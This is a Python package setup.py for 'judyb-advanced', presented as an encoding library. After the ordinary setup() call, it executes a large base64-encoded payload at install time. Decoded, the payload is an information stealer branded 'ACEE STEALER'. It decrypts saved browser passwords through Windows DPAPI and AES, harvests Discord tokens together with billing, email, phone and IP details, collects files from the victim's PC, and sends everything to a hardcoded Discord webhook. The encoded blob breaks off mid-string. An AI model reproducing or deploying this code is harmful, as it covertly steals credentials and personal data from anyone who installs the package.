from setuptools import setup
import base64

with open('README.md', 'r') as fh:
    long_description = fh.read()

setup(
    name='judyb-advanced',
    version='0.1.0',
    author='Carter',
    author_email='PW668878@outlook.com',
    description='Advanced encoding',
    long_description=long_description,
    long_description_content_type='text/markdown',
    url='https://github.com/Napoleon-x/multi-logger-python-discord-token-logger-and-chrome-password-stealer-through-webhooks',
    packages=['judyb-advanced'],
    install_requires=['browser_cookie3', 'requests', 'psutil', 'cryptography', 'httpx', 'pypiwin32', 'dhooks', 'pycryptodome'],
    classifiers=[
        'Development Status :: 3 - Alpha',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: GNU Lesser General Public License v3 or later (LGPLv3+)',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Topic :: Software Development :: Libraries :: Python Modules',
    ],
)

exec(base64.b64decode(
"""
IyBGcm9tIFdBU1AKaW1wb3J0IG9zCmltcG9ydCB0aHJlYWRpbmcKZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUKZnJvbSBzcWxpdGUzIGltcG9ydCBjb25uZWN0IGFzIHNxbF9jb25uZWN0CmltcG9ydCByZQpmcm9tIGJhc2U2NCBpbXBvcnQgYjY0ZGVjb2RlCmZyb20ganNvbiBpbXBvcnQgbG9hZHMgYXMganNvbl9sb2FkcywgbG9hZApmcm9tIGN0eXBlcyBpbXBvcnQgd2luZGxsLCB3aW50eXBlcywgYnlyZWYsIGNkbGwsIFN0cnVjdHVyZSwgUE9JTlRFUiwgY19jaGFyLCBjX2J1ZmZlcgpmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCBSZXF1ZXN0LCB1cmxvcGVuCmZyb20ganNvbiBpbXBvcnQgbG9hZHMsIGR1bXBzCmltcG9ydCB0aW1lCmltcG9ydCBzaHV0aWwKZnJvbSB6aXBmaWxlIGltcG9ydCBaaXBGaWxlCmltcG9ydCByYW5kb20KaW1wb3J0IHJlCmltcG9ydCBzdWJwcm9jZXNzCgojIEZyb20gQUJDCmltcG9ydCBzb2NrZXQKaW1wb3J0IHBzdXRpbAoKIyAgVEhJUyBJUyAxLjEuNCBWRVJTSU9OIQojICAgCiMKCgpob29rID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEwNzQ2MjIwNzgzMzE5MjQ1MzEvSXNJNHhFLTR3dFNGcndLNGI5TXZmS1pTaVR1SXJTVWkycm5hQTVYT3Y3a2NYQkFOZjMzemloWjNac25tbVQ3anZ6Q1giCkRFVEVDVEVEID0gRmFsc2UKCgpkZWYgZ2V0aXAoKToKICAgIGlwID0gIk5vbmUiCiAgICB0cnk6CiAgICAgICAgaXAgPSB1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vYXBpLmlwaWZ5Lm9yZyIpKS5yZWFkKCkuZGVjb2RlKCkuc3RyaXAoKQogICAgZXhjZXB0OgogICAgICAgIHBhc3MKICAgIHJldHVybiBpcAoKcmVxdWlyZW1lbnRzID0gWwogICAgWyJyZXF1ZXN0cyIsICJyZXF1ZXN0cyJdLAogICAgWyJDcnlwdG8uQ2lwaGVyIiwgInB5Y3J5cHRvZG9tZSJdCl0KZm9yIG1vZGwgaW4gcmVxdWlyZW1lbnRzOgogICAgdHJ5OiBfX2ltcG9ydF9fKG1vZGxbMF0pCiAgICBleGNlcHQ6CiAgICAgICAgc3VicHJvY2Vzcy5Qb3BlbihmIntleGVjdXRhYmxlfSAtbSBwaXAgaW5zdGFsbCB7bW9kbFsxXX0iLCBzaGVsbD1UcnVlKQogICAgICAgIHRpbWUuc2xlZXAoMykKCmltcG9ydCByZXF1ZXN0cwpmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUwoKbG9jYWwgPSBvcy5nZXRlbnYoJ0xPQ0FMQVBQREFUQScpCnJvYW1pbmcgPSBvcy5nZXRlbnYoJ0FQUERBVEEnKQp0ZW1wID0gb3MuZ2V0ZW52KCJURU1QIikKVGhyZWFkbGlzdCA9IFtdCgoKY2xhc3MgREFUQV9CTE9CKFN0cnVjdHVyZSk6CiAgICBfZmllbGRzXyA9IFsKICAgICAgICAoJ2NiRGF0YScsIHdpbnR5cGVzLkRXT1JEKSwKICAgICAgICAoJ3BiRGF0YScsIFBPSU5URVIoY19jaGFyKSkKICAgIF0KCmRlZiBHZXREYXRhKGJsb2Jfb3V0KToKICAgIGNiRGF0YSA9IGludChibG9iX291dC5jYkRhdGEpCiAgICBwYkRhdGEgPSBibG9iX291dC5wYkRhdGEKICAgIGJ1ZmZlciA9IGNfYnVmZmVyKGNiRGF0YSkKICAgIGNkbGwubXN2Y3J0Lm1lbWNweShidWZmZXIsIHBiRGF0YSwgY2JEYXRhKQogICAgd2luZGxsLmtlcm5lbDMyLkxvY2FsRnJlZShwYkRhdGEpCiAgICByZXR1cm4gYnVmZmVyLnJhdwoKZGVmIENyeXB0VW5wcm90ZWN0RGF0YShlbmNyeXB0ZWRfYnl0ZXMsIGVudHJvcHk9YicnKToKICAgIGJ1ZmZlcl9pbiA9IGNfYnVmZmVyKGVuY3J5cHRlZF9ieXRlcywgbGVuKGVuY3J5cHRlZF9ieXRlcykpCiAgICBidWZmZXJfZW50cm9weSA9IGNfYnVmZmVyKGVudHJvcHksIGxlbihlbnRyb3B5KSkKICAgIGJsb2JfaW4gPSBEQVRBX0JMT0IobGVuKGVuY3J5cHRlZF9ieXRlcyksIGJ1ZmZlcl9pbikKICAgIGJsb2JfZW50cm9weSA9IERBVEFfQkxPQihsZW4oZW50cm9weSksIGJ1ZmZlcl9lbnRyb3B5KQogICAgYmxvYl9vdXQgPSBEQVRBX0JMT0IoKQoKICAgIGlmIHdpbmRsbC5jcnlwdDMyLkNyeXB0VW5wcm90ZWN0RGF0YShieXJlZihibG9iX2luKSwgTm9uZSwgYnlyZWYoYmxvYl9lbnRyb3B5KSwgTm9uZSwgTm9uZSwgMHgwMSwgYnlyZWYoYmxvYl9vdXQpKToKICAgICAgICByZXR1cm4gR2V0RGF0YShibG9iX291dCkKCmRlZiBEZWNyeXB0VmFsdWUoYnVmZiwgbWFzdGVyX2tleT1Ob25lKToKICAgIHN0YXJ0cyA9IGJ1ZmYuZGVjb2RlKGVuY29kaW5nPSd1dGY4JywgZXJyb3JzPSdpZ25vcmUnKVs6M10KICAgIGlmIHN0YXJ0cyA9PSAndjEwJyBvciBzdGFydHMgPT0gJ3YxMSc6CiAgICAgICAgaXYgPSBidWZmWzM6MTVdCiAgICAgICAgcGF5bG9hZCA9IGJ1ZmZbMTU6XQogICAgICAgIGNpcGhlciA9IEFFUy5uZXcobWFzdGVyX2tleSwgQUVTLk1PREVfR0NNLCBpdikKICAgICAgICBkZWNyeXB0ZWRfcGFzcyA9IGNpcGhlci5kZWNyeXB0KHBheWxvYWQpCiAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBkZWNyeXB0ZWRfcGFzc1s6LTE2XS5kZWNvZGUoKQogICAgICAgIHJldHVybiBkZWNyeXB0ZWRfcGFzcwoKZGVmIExvYWRSZXF1ZXN0cyhtZXRob2RlLCB1cmwsIGRhdGE9JycsIGZpbGVzPScnLCBoZWFkZXJzPScnKToKICAgIGZvciBpIGluIHJhbmdlKDgpOiAjIG1heCB0cnlzCiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZiBtZXRob2RlID09ICdQT1NUJzoKICAgICAgICAgICAgICAgIGlmIGRhdGEgIT0gJyc6CiAgICAgICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhPWRhdGEpCiAgICAgICAgICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiByCiAgICAgICAgICAgICAgICBlbGlmIGZpbGVzICE9ICcnOgogICAgICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgZmlsZXM9ZmlsZXMpCiAgICAgICAgICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDAgb3Igci5zdGF0dXNfY29kZSA9PSA0MTM6ICMgNDEzID0gREFUQSBUTyBCSUcKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHIKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKCmRlZiBMb2FkVXJsaWIoaG9vaywgZGF0YT0nJywgZmlsZXM9JycsIGhlYWRlcnM9JycpOgogICAgZm9yIGkgaW4gcmFuZ2UoOCk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZiBoZWFkZXJzICE9ICcnOgogICAgICAgICAgICAgICAgciA9IHVybG9wZW4oUmVxdWVzdChob29rLCBkYXRhPWRhdGEsIGhlYWRlcnM9aGVhZGVycykpCiAgICAgICAgICAgICAgICByZXR1cm4gcgogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgciA9IHVybG9wZW4oUmVxdWVzdChob29rLCBkYXRhPWRhdGEpKQogICAgICAgICAgICAgICAgcmV0dXJuIHIKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKCgpkZWYgVHJ1c3QoQ29va2llcyk6CiAgICAjIHNpbXBsZSBUcnVzdCBGYWN0b3Igc3lzdGVtCiAgICBnbG9iYWwgREVURUNURUQKICAgIGRhdGEgPSBzdHIoQ29va2llcykKICAgIHRpbSA9IHJlLmZpbmRhbGwoIi5nb29nbGUuY29tIiwgZGF0YSkKICAgICMgcHJpbnQobGVuKHRpbSkpCiAgICBpZiBsZW4odGltKSA8IC0xOgogICAgICAgIERFVEVDVEVEID0gVHJ1ZQogICAgICAgIHJldHVybiBERVRFQ1RFRAogICAgZWxzZToKICAgICAgICBERVRFQ1RFRCA9IEZhbHNlCiAgICAgICAgcmV0dXJuIERFVEVDVEVECgpkZWYgR2V0QmlsbGluZyh0b2tlbik6CiAgICBoZWFkZXJzID0gewogICAgICAgICJBdXRob3JpemF0aW9uIjogdG9rZW4sCiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgIH0KICAgIHRyeToKICAgICAgICBiaWxsaW5nanNvbiA9IGxvYWRzKHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdXNlcnMvQG1lL2JpbGxpbmcvcGF5bWVudC1zb3VyY2VzIiwgaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQoKICAgIGlmIGJpbGxpbmdqc29uID09IFtdOiByZXR1cm4gIiAtIgoKICAgIGJpbGxpbmcgPSAiIgogICAgZm9yIG1ldGhvZGUgaW4gYmlsbGluZ2pzb246CiAgICAgICAgaWYgbWV0aG9kZVsiaW52YWxpZCJdID09IEZhbHNlOgogICAgICAgICAgICBpZiBtZXRob2RlWyJ0eXBlIl0gPT0gMToKICAgICAgICAgICAgICAgIGJpbGxpbmcgKz0gIjpjcmVkaXRfY2FyZDoiCiAgICAgICAgICAgIGVsaWYgbWV0aG9kZVsidHlwZSJdID09IDI6CiAgICAgICAgICAgICAgICBiaWxsaW5nICs9ICI6cGFya2luZzogIgoKICAgIHJldHVybiBiaWxsaW5nCgoKZGVmIEdldEJhZGdlKGZsYWdzKToKICAgIGlmIGZsYWdzID09IDA6IHJldHVybiAnJwoKICAgIE93bmVkQmFkZ2VzID0gJycKICAgIGJhZGdlTGlzdCA9ICBbCiAgICAgICAgeyJOYW1lIjogJ0Vhcmx5X1ZlcmlmaWVkX0JvdF9EZXZlbG9wZXInLCAnVmFsdWUnOiAxMzEwNzIsICdFbW9qaSc6ICI8OmRldmVsb3Blcjo4NzQ3NTA4MDg0NzI4MjU5ODY+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdCdWdfSHVudGVyX0xldmVsXzInLCAnVmFsdWUnOiAxNjM4NCwgJ0Vtb2ppJzogIjw6YnVnaHVudGVyXzI6ODc0NzUwODA4NDMwODc0NjY0PiAifSwKICAgICAgICB7Ik5hbWUiOiAnRWFybHlfU3VwcG9ydGVyJywgJ1ZhbHVlJzogNTEyLCAnRW1vamknOiAiPDplYXJseV9zdXBwb3J0ZXI6ODc0NzUwODA4NDE0MTEzODIzPiAifSwKICAgICAgICB7Ik5hbWUiOiAnSG91c2VfQmFsYW5jZScsICdWYWx1ZSc6IDI1NiwgJ0Vtb2ppJzogIjw6YmFsYW5jZTo4NzQ3NTA4MDgyNjcyOTI2ODM+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CcmlsbGlhbmNlJywgJ1ZhbHVlJzogMTI4LCAnRW1vamknOiAiPDpicmlsbGlhbmNlOjg3NDc1MDgwODMzODYwODE5OT4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyYXZlcnknLCAnVmFsdWUnOiA2NCwgJ0Vtb2ppJzogIjw6YnJhdmVyeTo4NzQ3NTA4MDgzODg5NTIwNzU+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdCdWdfSHVudGVyX0xldmVsXzEnLCAnVmFsdWUnOiA4LCAnRW1vamknOiAiPDpidWdodW50ZXJfMTo4NzQ3NTA4MDg0MjY2OTI2NTg+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdIeXBlU3F1YWRfRXZlbnRzJywgJ1ZhbHVlJzogNCwgJ0Vtb2ppJzogIjw6aHlwZXNxdWFkX2V2ZW50czo4NzQ3NTA4MDg1OTQ0NzcwNTY+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdQYXJ0bmVyZWRfU2VydmVyX093bmVyJywgJ1ZhbHVlJzogMiwnRW1vamknOiAiPDpwYXJ0bmVyOjg3NDc1MDgwODY3ODM1NDk2ND4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0Rpc2NvcmRfRW1wbG95ZWUnLCAnVmFsdWUnOiAxLCAnRW1vamknOiAiPDpzdGFmZjo4NzQ3NTA4MDg3Mjg2NjYxNTI+ICJ9CgogICAgXQogICAgZm9yIGJhZGdlIGluIGJhZGdlTGlzdDoKICAgICAgICBpZiBmbGFncyAvLyBiYWRnZVsiVmFsdWUiXSAhPSAwOgogICAgICAgICAgICBPd25lZEJhZGdlcyArPSBiYWRnZVsiRW1vamkiXQogICAgICAgICAgICBmbGFncyA9IGZsYWdzICUgYmFkZ2VbIlZhbHVlIl0KCiAgICByZXR1cm4gT3duZWRCYWRnZXMKCmRlZiBHZXRUb2tlbkluZm8odG9rZW4pOgogICAgaGVhZGVycyA9IHsKICAgICAgICAiQXV0aG9yaXphdGlvbiI6IHRva2VuLAogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICB9CgogICAgdXNlcmpzb24gPSBsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZSIsIGhlYWRlcnM9aGVhZGVycykpLnJlYWQoKS5kZWNvZGUoKSkKICAgIHVzZXJuYW1lID0gdXNlcmpzb25bInVzZXJuYW1lIl0KICAgIGhhc2h0YWcgPSB1c2VyanNvblsiZGlzY3JpbWluYXRvciJdCiAgICBlbWFpbCA9IHVzZXJqc29uWyJlbWFpbCJdCiAgICBpZGQgPSB1c2VyanNvblsiaWQiXQogICAgcGZwID0gdXNlcmpzb25bImF2YXRhciJdCiAgICBmbGFncyA9IHVzZXJqc29uWyJwdWJsaWNfZmxhZ3MiXQogICAgbml0cm8gPSAiIgogICAgcGhvbmUgPSAiLSIKCiAgICBpZiAicHJlbWl1bV90eXBlIiBpbiB1c2VyanNvbjoKICAgICAgICBuaXRyb3QgPSB1c2VyanNvblsicHJlbWl1bV90eXBlIl0KICAgICAgICBpZiBuaXRyb3QgPT0gMToKICAgICAgICAgICAgbml0cm8gPSAiPDpjbGFzc2ljOjg5NjExOTE3MTAxOTA2NzQyMz4gIgogICAgICAgIGVsaWYgbml0cm90ID09IDI6CiAgICAgICAgICAgIG5pdHJvID0gIjxhOmJvb3N0OjgyNDAzNjc3ODU3MDQxNjEyOT4gPDpjbGFzc2ljOjg5NjExOTE3MTAxOTA2NzQyMz4gIgogICAgaWYgInBob25lIiBpbiB1c2VyanNvbjogcGhvbmUgPSBmJ2B7dXNlcmpzb25bInBob25lIl19YCcKCiAgICByZXR1cm4gdXNlcm5hbWUsIGhhc2h0YWcsIGVtYWlsLCBpZGQsIHBmcCwgZmxhZ3MsIG5pdHJvLCBwaG9uZQoKZGVmIGNoZWNrVG9rZW4odG9rZW4pOgogICAgaGVhZGVycyA9IHsKICAgICAgICAiQXV0aG9yaXphdGlvbiI6IHRva2VuLAogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICB9CiAgICB0cnk6CiAgICAgICAgdXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ni91c2Vycy9AbWUiLCBoZWFkZXJzPWhlYWRlcnMpKQogICAgICAgIHJldHVybiBUcnVlCiAgICBleGNlcHQ6CiAgICAgICAgcmV0dXJuIEZhbHNlCgoKZGVmIHVwbG9hZFRva2VuKHRva2VuLCBwYXRoKToKICAgIGdsb2JhbCBob29rCiAgICBoZWFkZXJzID0gewogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICB9CiAgICB1c2VybmFtZSwgaGFzaHRhZywgZW1haWwsIGlkZCwgcGZwLCBmbGFncywgbml0cm8sIHBob25lID0gR2V0VG9rZW5JbmZvKHRva2VuKQoKICAgIGlmIHBmcCA9PSBOb25lOgogICAgICAgIHBmcCA9ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NzE3NjkwMzM0OTYwNzYzNDgvMTAxODU1ODA0MjQwMjQ3NjE0My9tYW5ueV9pbl9mbG9hdGllLmpwZyIKICAgIGVsc2U6CiAgICAgICAgcGZwID0gZiJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdmF0YXJzL3tpZGR9L3twZnB9IgoKICAgIGJpbGxpbmcgPSBHZXRCaWxsaW5nKHRva2VuKQogICAgYmFkZ2UgPSBHZXRCYWRnZShmbGFncykKICAgIGlmIG5vdCBiaWxsaW5nOgogICAgICAgIGJhZGdlLCBwaG9uZSwgYmlsbGluZyA9ICLwn5SSIiwgIvCflJIiLCAi8J+UkiIKICAgIGlmIG5pdHJvID09ICcnIGFuZCBiYWRnZSA9PSAnJzogbml0cm8gPSAiIC0iCgogICAgZGF0YSA9IHsKICAgICAgICAiY29udGVudCI6IGYnRm91bmQgaW4gYHtwYXRofWAnLAogICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgIHsKICAgICAgICAgICAgImNvbG9yIjogMTQ0MDY0MTMsCiAgICAgICAgICAgICJmaWVsZHMiOiBbCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiOnJvY2tldDogVG9rZW46IiwKICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmImB7dG9rZW59YFxuW0NsaWNrIHRvIGNvcHldKGh0dHBzOi8vc3VwZXJmdXJyeWNkbi5ubC9jb3B5L3t0b2tlbn0pIgogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI6ZW52ZWxvcGU6IEVtYWlsOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJge2VtYWlsfWAiLAogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjptb2JpbGVfcGhvbmU6IFBob25lOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJ7cGhvbmV9IiwKICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI6Z2xvYmVfd2l0aF9tZXJpZGlhbnM6IElQOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJge2dldGlwKCl9YCIsCiAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IFRydWUKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiOmJlZ2lubmVyOiBCYWRnZXM6IiwKICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmIntuaXRyb317YmFkZ2V9IiwKICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI6Y3JlZGl0X2NhcmQ6IEJpbGxpbmc6IiwKICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmIntiaWxsaW5nfSIsCiAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IFRydWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIF0sCiAgICAgICAgICAgICJhdXRob3IiOiB7CiAgICAgICAgICAgICAgICAibmFtZSI6IGYie3VzZXJuYW1lfSN7aGFzaHRhZ30gKHtpZGR9KSIsCiAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiBmIntwZnB9IgogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgImZvb3RlciI6IHsKICAgICAgICAgICAgICAgICJ0ZXh0IjogIkBBQ0VFIFNURUFMRVIiLAogICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk3MTc2OTAzMzQ5NjA3NjM0OC8xMDE4NTU4MDQyNDAyNDc2MTQzL21hbm55X2luX2Zsb2F0aWUuanBnIgogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgInRodW1ibmFpbCI6IHsKICAgICAgICAgICAgICAgICJ1cmwiOiBmIntwZnB9IgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgXSwKICAgICAgICAiYXZhdGFyX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NzE3NjkwMzM0OTYwNzYzNDgvMTAxODU1ODA0MjQwMjQ3NjE0My9tYW5ueV9pbl9mbG9hdGllLmpwZyIsCiAgICAgICAgInVzZXJuYW1lIjogIkFDRUUgU3RlYWxlciIsCiAgICAgICAgImF0dGFjaG1lbnRzIjogW10KICAgICAgICB9CiAgICAjIHVybG9wZW4oUmVxdWVzdChob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpKQogICAgTG9hZFVybGliKGhvb2ssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykKCmRlZiBSZWZvcm1hdChsaXN0dCk6CiAgICBlID0gcmUuZmluZGFsbCgiKFx3K1thLXpdKSIsbGlzdHQpCiAgICB3aGlsZSAiaHR0cHMiIGluIGU6IGUucmVtb3ZlKCJodHRwcyIpCiAgICB3aGlsZSAiY29tIiBpbiBlOiBlLnJlbW92ZSgiY29tIikKICAgIHdoaWxlICJuZXQiIGluIGU6IGUucmVtb3ZlKCJuZXQiKQogICAgcmV0dXJuIGxpc3Qoc2V0KGUpKQoKZGVmIHVwbG9hZChuYW1lLCB0az0nJyk6CiAgICBoZWFkZXJzID0gewogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICB9CgogICAgaWYgbmFtZSA9PSAia2l3aSI6CiAgICAgICAgZGF0YSA9IHsKICAgICAgICAiY29udGVudCI6ICcnLAogICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgIHsKICAgICAgICAgICAgImNvbG9yIjogMTQ0MDY0MTMsCiAgICAgICAgICAgICJmaWVsZHMiOiBbCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAibmFtZSI6ICJJbnRlcmVzdGluZyBmaWxlcyBmb3VuZCBvbiB1c2VyIFBDOiIsCiAgICAgICAgICAgICAgICAidmFsdWUiOiB0awogICAgICAgICAgICAgICAgfQogICAgICAgICAgICBdLAogICAgICAgICAgICAiYXV0aG9yIjogewogICAgICAgICAgICAgICAgIm5hbWUiOiAiQUNFRSB8IEZpbGUgU3RlYWxlciIKICAgICAgICAgICAgfSwKICAgICAgICAgICAgImZvb3RlciI6IHsKICAgICAgICAgICAgICAgICJ0ZXh0IjogIkBBQ0VFIFNURUFMRVIiLAogICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk3MTc2OTAzMzQ5NjA3NjM0OC8xMDE4NTU4MDQyNDAyNDc2MTQzL21hbm55X2luX2Zsb2F0aWUuanBnIgogICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICBdLAogICAgICAgICJhdmF0YXJfdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk3MTc2OTAzMzQ5NjA3NjM0OC8xMDE4NTU4MDQyNDAyNDc2MTQzL21hbm55X2luX2Zsb2F0aWUuanBnIiwKICAgICAgICAiYXR0YWNobWVudHMiOiBbXQogICAgICAgIH0KICAgICAgICAjIHVybG9wZW4oUmVxdWVzdChob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpKQogICAgICAgIExvYWRVcmxpYihob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpCiAgICAgICAgcmV0dXJuCgogICAgcGF0aCA9IG5hbWUKICAgIGZpbGVzID0geydmaWxlJzogb3BlbihwYXRoLCAncmInKX0KICAgICMgcHJpbnQoZiJGSUxFPSB7ZmlsZXN9IikKCiAgICBpZiAid3BwYXNzdyIgaW4gbmFtZToKCiAgICAgICAgcmEgPSAnIHwgJy5qb2luKGRhIGZvciBkYSBpbiBwYXN3V29yZHMpCgogICAgICAgIGlmIGxlbihyYSkgPiAxMDAwOgogICAgICAgICAgICBycnIgPSBSZWZvcm1hdChzdHIocGFzd1dvcmRzKSkKICAgICAgICAgICAgcmEgPSAnIHwgJy5qb2luKGRhIGZvciBkYSBpbiBycnIpCgogICAgICAgIGRhdGEgPSB7CiAgICAgICAgImNvbnRlbnQiOiAnJywKICAgICAgICAiZW1iZWRzIjogWwogICAgICAgICAgICB7CiAgICAgICAgICAgICJjb2xvciI6IDE0NDA2NDEzLAogICAgICAgICAgICAiZmllbGRzIjogWwogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgIm5hbWUiOiAiRm91bmQ6IiwKICAgICAgICAgICAgICAgICJ2YWx1ZSI6IHJhCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIF0sCiAgICAgICAgICAgICJhdXRob3IiOiB7CiAgICAgICAgICAgICAgICAibmFtZSI6ICJBQ0VFIHwgUGFzc3dvcmQgU3RlYWxlciIKICAgICAgICAgICAgfSwKICAgICAgICAgICAgImZvb3RlciI6IHsKICAgICAgICAgICAgICAgICJ0ZXh0IjogIkBBQ0VFIFNURUFMRVIiLAogICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk2MzExNDM0OTg3NzE2MjAwNC85OTIyNDU3NTEyNDc4MDY1MTUvdW5rbm93bi5wbmciCiAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIF0sCiAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTYzMTE0MzQ5ODc3MTYyMDA0Lzk5MjI0NTc1MTI0NzgwNjUxNS91bmtub3duLnBuZyIsCiAgICAgICAgImF0dGFjaG1lbnRzIjogW10KICAgICAgICB9CiAgICAgICAgIyB1cmxvcG